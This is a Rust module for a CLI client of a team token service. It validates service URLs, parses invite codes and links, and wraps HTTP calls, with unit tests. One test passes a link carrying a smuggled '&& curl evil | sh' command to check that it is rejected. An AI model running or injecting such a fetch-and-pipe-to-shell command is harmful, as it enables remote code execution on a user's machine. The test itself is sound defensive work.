//! Client for the team token service in `server/`. StayKit hosts one copy;
//! teams can also run their own and point the CLI at it.

use base64::Engine;

use crate::error::{CliError, Result};
use crate::http;
use crate::json::{self, Json, json};
use crate::output::printable;

pub const HOSTED_TOKEN_SERVICE_URL: &str = "https://guesty-tokens.staykit.ai";
/// The hosted service's address before it moved to StayKit. It still works,
/// and settings and invites that use it are read as the new address.
const FORMER_HOSTED_TOKEN_SERVICE_URL: &str = "https://guesty-tokens.simplyvacationrentalmanagement.com";
pub const TOKEN_SERVICE_URL_ENV: &str = "GUESTY_TOKEN_SERVICE_URL";
pub const TOKEN_SERVICE_KEY_ENV: &str = "GUESTY_TOKEN_SERVICE_KEY";
const INVITE_PREFIX: &str = "gti_";
/// Creating a team or renewing a token waits for Guesty, which can take 20 seconds.
const REQUEST_TIMEOUT_MS: u64 = 30_000;

#[derive(Debug)]
pub struct TokenServiceError {
    pub message: String,
    /// 0 when the service couldn't be reached.
    pub status: u16,
    pub code: Option<String>,
    pub retry_at: Option<f64>,
}

impl From<TokenServiceError> for CliError {
    fn from(e: TokenServiceError) -> Self {
        CliError::Message(e.message)
    }
}

#[derive(Clone, Debug, PartialEq)]
pub struct ServiceSettings {
    pub url: String,
    pub key: String,
}

/// `new URL(value)` for an absolute URL.
pub fn parse_url(value: &str) -> Option<url::Url> {
    url::Url::parse(value).ok()
}

/// `url.href` as JavaScript prints it.
fn href(url: &url::Url) -> String {
    url.as_str().to_string()
}

/// The access key travels with every request, so it may only go over HTTPS,
/// except to a service on this machine.
pub fn service_url(value: &str) -> Result<String> {
    let url = parse_url(value).ok_or_else(|| CliError::new(format!("{value} is not a valid token service URL.")))?;
    let host = url.host_str().unwrap_or("");
    let local = ["localhost", "127.0.0.1", "[::1]"].contains(&host);
    if url.scheme() != "https" && !(url.scheme() == "http" && local) {
        return Err(CliError::new("The token service URL must use https."));
    }
    let href = href(&url).trim_end_matches('/').to_string();
    Ok(if href == FORMER_HOSTED_TOKEN_SERVICE_URL { HOSTED_TOKEN_SERVICE_URL.to_string() } else { href })
}

pub fn is_access_key(value: &str) -> bool {
    value.len() == 47
        && value.starts_with("gts_")
        && value[4..].chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

pub fn encode_invite(settings: &ServiceSettings) -> String {
    let body = json::compact(&json!({ "url": settings.url, "key": settings.key }));
    format!("{INVITE_PREFIX}{}", base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(body))
}

pub fn decode_invite(code: &str) -> Result<ServiceSettings> {
    let trimmed = code.trim();
    let not_invite = || CliError::new("This is not a Guesty CLI invite code. Ask your team's admin for one (guesty team invite).");
    let rest = trimmed.strip_prefix(INVITE_PREFIX).ok_or_else(not_invite)?;
    // Node's base64url decoder ignores characters outside the alphabet and padding.
    let cleaned: String = rest.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').collect();
    let bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(cleaned.trim_end_matches('='))
        .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(&cleaned[..cleaned.len() - cleaned.len() % 4]))
        .map_err(|_| not_invite())?;
    let decoded = json::parse(&String::from_utf8_lossy(&bytes)).map_err(|_| not_invite())?;
    let incomplete = || CliError::new("This invite code is incomplete. Ask your team's admin for a new one.");
    let url = decoded.get("url").and_then(Json::as_str).ok_or_else(incomplete)?;
    let key = decoded.get("key").and_then(Json::as_str).ok_or_else(incomplete)?;
    if !is_access_key(key) {
        return Err(incomplete());
    }
    Ok(ServiceSettings { url: service_url(url)?, key: key.to_string() })
}

#[derive(Debug, Clone)]
pub enum Invite {
    Code { url: String, code: String },
    Key(ServiceSettings),
}

/// A one-time code such as ABCD-EFGH-JKLM in any case, with or without dashes.
/// Crockford's base 32 has no I, L, O or U, so those are read as 1, 1 and 0.
pub fn invite_code(value: &str) -> Result<String> {
    let code: String = value
        .to_uppercase()
        .chars()
        .filter(|c| !c.is_whitespace() && *c != '-')
        .map(|c| match c {
            'O' => '0',
            'I' | 'L' => '1',
            c => c,
        })
        .collect();
    let valid = code.chars().count() == 12
        && code.chars().all(|c| c.is_ascii_digit() || (c.is_ascii_uppercase() && !"ILOU".contains(c)));
    if !valid {
        return Err(CliError::new("This isn't an invite code or link. Invite codes look like ABCD-EFGH-JKLM."));
    }
    Ok(code)
}

/// An invite is a code for the hosted service, a join link from any service
/// (https://service/join/CODE), or a gti_ code from CLI 1.4, which holds a key.
pub fn parse_invite(value: &str) -> Result<Invite> {
    let trimmed = value.trim();
    if trimmed.starts_with(INVITE_PREFIX) {
        return Ok(Invite::Key(decode_invite(trimmed)?));
    }
    let lower = trimmed.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        let url = parse_url(trimmed)
            .ok_or_else(|| CliError::new("This invite link isn't a valid web address. Copy the whole link and try again."))?;
        let not_link = || CliError::new("This link isn't a Guesty CLI invite link. Those end in /join/ and a code.");
        // /^(.*)\/join\/([^/]+)\/?$/
        let pathname = url.path();
        // /^(.*)\/join\/([^/]+)\/?$/ on the pathname.
        let path = pathname.strip_suffix('/').unwrap_or(pathname);
        let (prefix, code) = path.rsplit_once("/join/").ok_or_else(not_link)?;
        if code.is_empty() || code.contains('/') || url.query().is_some_and(|q| !q.is_empty()) || url.fragment().is_some_and(|f| !f.is_empty()) {
            return Err(not_link());
        }
        let origin = url.origin().ascii_serialization();
        return Ok(Invite::Code { url: service_url(&format!("{origin}{prefix}"))?, code: invite_code(code)? });
    }
    Ok(Invite::Code { url: HOSTED_TOKEN_SERVICE_URL.to_string(), code: invite_code(trimmed)? })
}

pub fn display_code(code: &str) -> String {
    code.as_bytes().chunks(4).map(|c| String::from_utf8_lossy(c).into_owned()).collect::<Vec<_>>().join("-")
}

/// A link a service returned for a new invite. The service may be someone
/// else's server, so the link must point back at it, and the link and the
/// command to share are rebuilt here from the parsed code.
pub fn invited_link(service: &str, value: &Json) -> Result<(String, String)> {
    let invalid = || CliError::new("The token service returned an invalid invite link.");
    let text = value.as_str().ok_or_else(invalid)?;
    let lower = text.to_ascii_lowercase();
    if !(lower.starts_with("http://") || lower.starts_with("https://")) {
        return Err(invalid());
    }
    let Ok(Invite::Code { url, code }) = parse_invite(text) else { return Err(invalid()) };
    if url != service_url(service)? {
        return Err(CliError::new("The token service returned an invite link for a different service."));
    }
    let link = format!("{url}/join/{}", display_code(&code));
    let command = format!(
        "guesty join {}",
        if url == HOSTED_TOKEN_SERVICE_URL { display_code(&code) } else { link.clone() }
    );
    Ok((link, command))
}

pub fn configured_service() -> Result<Option<ServiceSettings>> {
    let url = std::env::var(TOKEN_SERVICE_URL_ENV).unwrap_or_default();
    let key = std::env::var(TOKEN_SERVICE_KEY_ENV).unwrap_or_default();
    if url.is_empty() || key.is_empty() {
        return Ok(None);
    }
    Ok(Some(ServiceSettings { url: service_url(&url)?, key }))
}

/// Calls the token service. Every failure is a `TokenServiceError`.
pub fn call(
    url: &str,
    method: &str,
    path: &str,
    key: Option<&str>,
    body: Option<&Json>,
    timeout_ms: Option<u64>,
) -> std::result::Result<Json, CallError> {
    let base = service_url(url).map_err(CallError::Other)?;
    let mut headers = vec![("Accept".to_string(), "application/json".to_string())];
    if let Some(k) = key.filter(|k| !k.is_empty()) {
        headers.push(("Authorization".into(), format!("Bearer {k}")));
    }
    if body.is_some() {
        headers.push(("Content-Type".into(), "application/json".into()));
    }
    let unreachable = || {
        CallError::Service(TokenServiceError {
            message: format!("The token service at {base} could not be reached."),
            status: 0,
            code: None,
            retry_at: None,
        })
    };
    let target = format!("{base}{path}");
    let response = http::send(http::Request {
        method,
        url: &target,
        headers,
        body: body.map(|b| json::compact(b).into_bytes()),
        timeout_ms: timeout_ms.unwrap_or(REQUEST_TIMEOUT_MS),
    })
    .map_err(|_| unreachable())?;
    // fetch's redirect: "error" rejects any redirect.
    if (300..400).contains(&response.status) && response.header("location").is_some() {
        return Err(unreachable());
    }
    let status = response.status;
    let parsed = response.text().ok().and_then(|t| json::parse(&t).ok());
    let Some(body) = parsed else {
        return Err(CallError::Service(TokenServiceError {
            message: format!("The token service at {base} returned an unexpected response (HTTP {status})."),
            status,
            code: None,
            retry_at: None,
        }));
    };
    if !response.ok() {
        let field = |name: &str| body.as_object().and_then(|o| o.get(name));
        return Err(CallError::Service(TokenServiceError {
            message: match field("message").and_then(Json::as_str) {
                Some(m) => printable(m),
                None => format!("The token service returned HTTP {status}."),
            },
            status,
            code: field("error").and_then(Json::as_str).map(str::to_string),
            retry_at: field("retry_at").and_then(Json::as_f64),
        }));
    }
    Ok(body)
}

/// A token-service call that failed: from the service, or before it (a bad URL).
#[derive(Debug)]
pub enum CallError {
    Service(TokenServiceError),
    Other(CliError),
}

impl From<CallError> for CliError {
    fn from(e: CallError) -> Self {
        match e {
            CallError::Service(s) => s.into(),
            CallError::Other(c) => c,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn service_urls() {
        assert_eq!(service_url("https://Example.com/").unwrap(), "https://example.com");
        assert_eq!(service_url("http://127.0.0.1:8787").unwrap(), "http://127.0.0.1:8787");
        assert!(service_url("http://example.com").is_err());
        assert_eq!(service_url(FORMER_HOSTED_TOKEN_SERVICE_URL).unwrap(), HOSTED_TOKEN_SERVICE_URL);
        assert_eq!(service_url("https://x.dev:443/base/").unwrap(), "https://x.dev/base");
    }

    #[test]
    fn invites() {
        // L reads as 1 (Crockford), as the Node CLI read it.
        assert_eq!(invite_code("abcd-efgh-jklm").unwrap(), "ABCDEFGHJK1M");
        assert_eq!(invite_code("oil0-0000-0000").unwrap(), "011000000000");
        assert!(invite_code("ABCD").is_err());
        match parse_invite("https://svc.example/join/ABCD-EFGH-JKLM").unwrap() {
            Invite::Code { url, code } => {
                assert_eq!(url, "https://svc.example");
                assert_eq!(code, "ABCDEFGHJK1M");
            }
            _ => panic!(),
        }
        let settings = ServiceSettings { url: "https://svc.example".into(), key: format!("gts_{}", "A".repeat(43)) };
        assert_eq!(decode_invite(&encode_invite(&settings)).unwrap(), settings);
    }
}

/// Ports of test/invite.test.mjs, which imported parseInvite, invitedLink and
/// serviceUrl from dist/token-service.js.
#[cfg(test)]
mod invite_tests {
    use super::*;
    use crate::json::json;

    fn code(value: &str) -> (String, String) {
        match parse_invite(value).unwrap_or_else(|e| panic!("{value}: {}", e.message())) {
            Invite::Code { url, code } => (url, code),
            Invite::Key(s) => panic!("{value}: expected a code, got a key for {}", s.url),
        }
    }

    fn key(value: &str) -> ServiceSettings {
        match parse_invite(value).unwrap_or_else(|e| panic!("{}", e.message())) {
            Invite::Key(s) => s,
            Invite::Code { .. } => panic!("expected a key"),
        }
    }

    fn refused(result: Result<impl std::fmt::Debug>, pattern: &str) {
        match result {
            Ok(v) => panic!("expected /{pattern}/, got {v:?}"),
            Err(e) => assert!(e.message().contains(pattern), "expected /{pattern}/, got {}", e.message()),
        }
    }

    fn legacy(url: &str, key: &str) -> String {
        let body = json::compact(&json!({ "url": url, "key": key }));
        format!("gti_{}", base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(body))
    }

    #[test]
    fn a_code_alone_is_for_the_hosted_service_in_any_case_and_with_misread_letters() {
        assert_eq!(code("abcd-efgh-jkmn"), (HOSTED_TOKEN_SERVICE_URL.to_string(), "ABCDEFGHJKMN".to_string()));
        assert_eq!(code(" 0O1I L2Z3 4567\n"), (HOSTED_TOKEN_SERVICE_URL.to_string(), "001112Z34567".to_string()));
    }

    #[test]
    fn a_link_carries_its_services_address() {
        assert_eq!(
            code("https://tokens.example.com/join/ABCD-EFGH-JKMN"),
            ("https://tokens.example.com".into(), "ABCDEFGHJKMN".into())
        );
        assert_eq!(
            code("https://example.com/tokens/join/abcd-efgh-jkmn/"),
            ("https://example.com/tokens".into(), "ABCDEFGHJKMN".into())
        );
        assert_eq!(code("http://127.0.0.1:8787/join/ABCD-EFGH-JKMN").0, "http://127.0.0.1:8787");
    }

    #[test]
    fn a_cli_1_4_code_still_carries_its_service_and_key() {
        let k = format!("gts_{}", "a".repeat(43));
        assert_eq!(
            key(&legacy("https://tokens.example.com", &k)),
            ServiceSettings { url: "https://tokens.example.com".into(), key: k }
        );
    }

    #[test]
    fn anything_else_is_refused_with_what_an_invite_looks_like() {
        refused(parse_invite("ABCD-EFGH"), "Invite codes look like ABCD-EFGH-JKLM");
        refused(parse_invite("ABCD-EFGH-JKMU"), "Invite codes look like");
        refused(parse_invite("http://tokens.example.com/join/ABCD-EFGH-JKMN"), "must use https");
        refused(parse_invite("https://tokens.example.com/listings/ABCD-EFGH-JKMN"), "isn't a Guesty CLI invite link");
        refused(
            parse_invite("https://tokens.example.com/join/ABCD-EFGH-JKMN?ref=mail"),
            "isn't a Guesty CLI invite link",
        );
        refused(parse_invite("gti_bm90LWpzb24"), "not a Guesty CLI invite code");
    }

    #[test]
    fn a_link_from_the_service_must_point_back_at_it_and_the_command_is_built_here() {
        let pair = |a: String, b: &str| (a, b.to_string());
        assert_eq!(
            invited_link(HOSTED_TOKEN_SERVICE_URL, &json!(format!("{HOSTED_TOKEN_SERVICE_URL}/join/abcd-efgh-jkmn")))
                .unwrap(),
            pair(format!("{HOSTED_TOKEN_SERVICE_URL}/join/ABCD-EFGH-JKMN"), "guesty join ABCD-EFGH-JKMN")
        );
        assert_eq!(
            invited_link("https://tokens.example.com", &json!("https://tokens.example.com/join/ABCD-EFGH-JKMN"))
                .unwrap(),
            pair(
                "https://tokens.example.com/join/ABCD-EFGH-JKMN".into(),
                "guesty join https://tokens.example.com/join/ABCD-EFGH-JKMN"
            )
        );
        refused(
            invited_link("https://tokens.example.com", &json!("https://evil.example/join/ABCD-EFGH-JKMN")),
            "for a different service",
        );
        refused(
            invited_link(
                "https://tokens.example.com",
                &json!("https://tokens.example.com/join/ABCD-EFGH-JKMN && curl evil | sh"),
            ),
            "invalid invite link",
        );
        refused(invited_link(HOSTED_TOKEN_SERVICE_URL, &json!("ABCD-EFGH-JKMN")), "invalid invite link");
        refused(invited_link(HOSTED_TOKEN_SERVICE_URL, &json!(42)), "invalid invite link");
    }

    #[test]
    fn the_hosted_services_former_address_is_read_as_its_staykit_address() {
        assert_eq!(HOSTED_TOKEN_SERVICE_URL, "https://guesty-tokens.staykit.ai");
        assert_eq!(
            service_url("https://guesty-tokens.simplyvacationrentalmanagement.com/").unwrap(),
            HOSTED_TOKEN_SERVICE_URL
        );
        assert_eq!(
            code("https://guesty-tokens.simplyvacationrentalmanagement.com/join/ABCD-EFGH-JKMN"),
            (HOSTED_TOKEN_SERVICE_URL.into(), "ABCDEFGHJKMN".into())
        );
        let k = format!("gts_{}", "a".repeat(43));
        assert_eq!(
            key(&legacy("https://guesty-tokens.simplyvacationrentalmanagement.com", &k)),
            ServiceSettings { url: HOSTED_TOKEN_SERVICE_URL.into(), key: k }
        );
        assert_eq!(service_url("https://tokens.example.com/").unwrap(), "https://tokens.example.com");
    }
}
